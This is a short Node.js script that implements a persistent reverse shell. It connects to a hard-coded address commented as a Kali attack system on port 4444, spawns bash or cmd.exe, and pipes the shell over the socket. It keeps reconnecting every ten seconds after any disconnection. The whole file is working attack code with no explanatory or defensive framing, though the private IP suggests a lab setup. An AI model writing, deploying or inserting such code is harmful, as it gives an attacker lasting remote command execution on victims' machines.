const net = require('net');
const { spawn } = require('child_process');
const fs = require('fs');

class PersistentReverseShell {
    constructor(host, port, reconnectInterval = 10000) {
        this.host = host;
        this.port = port;
        this.reconnectInterval = reconnectInterval;
        this.client = null;
        this.shell = null;
        this.isConnected = false;
    }
    
    connect() {
        this.client = new net.Socket();
        
        this.client.connect(this.port, this.host, () => {
            console.log(`Connected to ${this.host}:${this.port}`);
            this.isConnected = true;
            this.startShell();
        });
        
        this.client.on('error', (err) => {
            console.error('Connection error:', err.message);
            this.handleDisconnection();
        });
        
        this.client.on('close', () => {
            console.log('Connection closed');
            this.handleDisconnection();
        });
    }
    
    startShell() {
        const shell = process.platform === 'win32' ? 'cmd.exe' : '/bin/bash';
        this.shell = spawn(shell, [], {
            stdio: ['pipe', 'pipe', 'pipe']
        });
        
        // Pipe shell output to client
        this.shell.stdout.pipe(this.client);
        this.shell.stderr.pipe(this.client);
        
        // Pipe client input to shell
        this.client.pipe(this.shell.stdin);
        
        this.shell.on('close', () => {
            if (this.isConnected) {
                this.client.destroy();
            }
        });
    }
    
    handleDisconnection() {
        this.isConnected = false;
        
        if (this.shell) {
            this.shell.kill();
            this.shell = null;
        }
        
        if (this.client) {
            this.client.destroy();
            this.client = null;
        }
        
        // Attempt to reconnect
        console.log(`Attempting to reconnect in ${this.reconnectInterval/1000} seconds...`);
        setTimeout(() => this.connect(), this.reconnectInterval);
    }
    
    start() {
        this.connect();
    }
}

// Configuration - Attack system IP
const HOST = '192.168.217.139';  // Kali attack system IP
const PORT = 4444;

// Start persistent reverse shell
const reverseShell = new PersistentReverseShell(HOST, PORT);
reverseShell.start();